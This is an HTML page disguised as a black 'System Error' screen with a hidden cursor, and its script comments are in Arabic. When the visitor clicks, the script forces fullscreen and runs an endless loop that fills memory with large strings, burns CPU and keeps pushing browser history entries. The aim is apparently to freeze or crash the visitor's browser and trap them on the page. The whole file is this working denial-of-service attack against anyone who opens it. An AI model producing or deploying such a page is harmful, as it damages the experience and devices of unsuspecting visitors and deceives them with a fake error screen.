<!DOCTYPE html>
<html style="background-color: black; cursor: none;">
<head>
    <title>System Error</title>
    <style>
        body { 
            background-color: black; 
            color: black; 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            width: 100vw; 
            height: 100vh;
        }
    </style>
</head>
<body>
    <script>
        // تفعيل وضع الشاشة الكاملة أول ما يلمس المستخدم الشاشة
        document.addEventListener('click', function() {
            document.documentElement.requestFullscreen();
            
            // البدء في جلد المعالج والرام
            let memoryHog = [];
            while(true) {
                // استهلاك الرام بجنون
                memoryHog.push(new Array(1000000).join('CRASH'));
                // استهلاك المعالج
                Math.sqrt(Math.random() * Math.random());
                // محاولة فتح روابط وهمية لزيادة الضغط
                window.history.pushState(null, null, window.location.href);
            }
        });
    </script>
</body>
</html>
